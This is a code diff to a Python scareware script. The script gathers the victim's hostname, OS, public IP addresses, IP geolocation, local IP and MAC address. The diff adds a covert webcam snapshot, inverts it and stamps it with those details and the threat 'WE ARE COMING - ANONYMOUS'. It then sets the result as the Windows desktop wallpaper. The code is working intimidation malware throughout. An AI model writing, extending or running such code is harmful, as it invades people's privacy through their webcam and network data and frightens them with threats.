@@ -2,9 +2,6 @@ from PIL import Image, ImageDraw
 from PIL import ImageFont, ImageDraw, Image
 import ctypes
 from uuid import getnode as get_mac
-import smtplib, ssl
-from email.message import EmailMessage
-import geocoder
 import subprocess
 import socket
 from requests import get
@@ -15,8 +12,9 @@ import sys
 import platform
 import time
 from PIL import Image
-
-startTime = time.time()
+import cv2 as cv
+import PIL.ImageOps
+from PIL import Image
 
 #Operating System Information
 print('Getting System Information...')
@@ -35,7 +33,6 @@ print('Requesting IPV4 Adress from api.ipify.org...')
 get_ip = get('https://api.ipify.org').content.decode('utf8')
 print('Requesting IPV6 Adress from api.ipify.org...')
 get_ipv6 = get('https://api64.ipify.org').content.decode('utf8')
-ip = geocoder.ip(get_ipv6)
 
 #IP JSON Configuration
 print('Requesting IP Adress Information From ip-api.com...')
@@ -45,22 +42,11 @@ y = ip_json.json()
 #Extract Details From IP ip-api JSON
 print('Parsing JSON Data From API Request...')
 country_code = y['country']
-city_name = y['city']
-region = y['regionName']
-zip_code = y['zip']
-district = y['district']
 
 latstring = str(y['lat'])
 longstring = str(y['lon'])
 
 ip_coords = latstring + ' ' + longstring
-
-if zip_code == '':
-    zip_code = 'Not Detected'
-
-if district == '':
-    district = 'Not Detected'
-    
 
 #Local IP Configuration
 print('Getting Local Network IP...')
@@ -71,9 +57,10 @@ IPAddr=socket.gethostbyname(hostname)
 print('Grabbing MAC Adress...')
 mac_adress = get_mac()
 
-#Assign Variables
+#Assign Content Variables
 content = f"Device Name: {hostname}\n"
 content += f"Operating System: {my_os}, {my_os_extra}\n"
+content += f"Country: {country_code}\n"
 content += f"System Timezone: {local_tzname}\n"
 content += f"System Time: {now}\n"
 content += f"Public IPV4 Adress: {get_ip}\n"
@@ -83,19 +70,44 @@ content += f"local MAC Adress: {mac_adress}\n"
 content += "\n\nWE ARE COMING\n\n"
 content += "- ANONYMOUS"
 
-#Make Image
+#Take image from webcam
+cam = cv.VideoCapture(0)   
+s, img = cam.read()
+cv.imwrite("C:/tmp/scare.jpg",img)
+base_image = Image.open('C:\\tmp\\scare.jpg')
 
-#Download image of anonymous mask
-os.system('curl -o C:\\tmp\\scare.png https://miro.medium.com/max/2000/1*EQPani1J-PTO-ccp588gBg.jpeg')
-base_image = Image.open(r"C:\\tmp\\scare.png")
+#Invert colours
+base_image = base_image.convert("L")
+base_image = PIL.ImageOps.invert(base_image)
+base_image = base_image.convert("RGBA")
+
+
+#Get centre of image
+width = base_image.size[0]
+height = base_image.size[1]
+
+triple_height = height*3
+triple_width = width*3
+
+centre_width = triple_width/1.8
+centre_height = triple_height/2
+
+#Resize Image
+base_image = base_image.resize((triple_width, triple_height))
+
+#Draw text over image
+text_size = triple_width/60
+text_size = int(text_size)
+
+print(text_size)
 
 draw = ImageDraw.Draw(base_image, "RGBA")
-font = ImageFont.truetype("arial.ttf", 35)
-draw.text((670, 450), content, fill=(255, 255, 255, 255), font=font)
+font = ImageFont.truetype("arial.ttf", text_size)
+draw.text((centre_width, centre_height), content, fill=(255, 0, 0, 255), font=font, anchor="mm",)
 base_image.save("C:\\tmp\\scary.png")
 
 #Set As Desktop Background
 ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\\tmp\\scary.png" , 0)
-os.remove('C:\\tmp\\scare.png')
+os.remove('C:\\tmp\\scare.jpg')
 
 
